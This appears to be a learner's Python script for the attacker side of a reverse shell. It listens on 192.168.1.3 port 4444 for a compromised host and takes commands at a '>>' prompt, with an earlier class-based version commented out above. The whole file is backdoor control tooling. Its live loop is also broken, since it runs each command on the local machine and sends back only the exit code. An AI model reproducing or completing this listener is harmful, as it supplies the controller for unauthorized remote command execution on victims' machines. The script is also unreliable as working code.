#!/usr/bin/python
# import socket


# class Listener:
# 	def __init__(self, ip, port):

# 		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# 		listener.bind((ip, port))
# 		listener.listen(0)
# 		print("[+] Waiting for incoming connections")
# 		self.connection, address = listener.accept()
# 		print("[+] Connection established with " + str(address))
	


# 	def execute_remotely(self, command):
# 		self.connection.send(command)
# 		result = self.connection.recv(1024)
	

# 	def run(self):
# 		while True:
# 			command = input(">> ")
# 			result = self.execute_remotely(command)
# 			print(result)

# my_listener = Listener("192.168.1.3", 4444)
# my_listener.run()


import socket
import subprocess

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.1.3", 4444))
listener.listen(0)
print("[+] Waiting for incoming connections")
connection, address = listener.accept()
print("[+] Connection established with " + str(address))

while True:
    #command = subprocess.call(input(">> "))
    #command = str(command)
    #command = subprocess.call(command)
    command = input(">> ")
    
    command = subprocess.call(command)
    command = str(command)
    connection.send(command.encode('ASCII'))
    result = connection.recv(1024)
    print(result)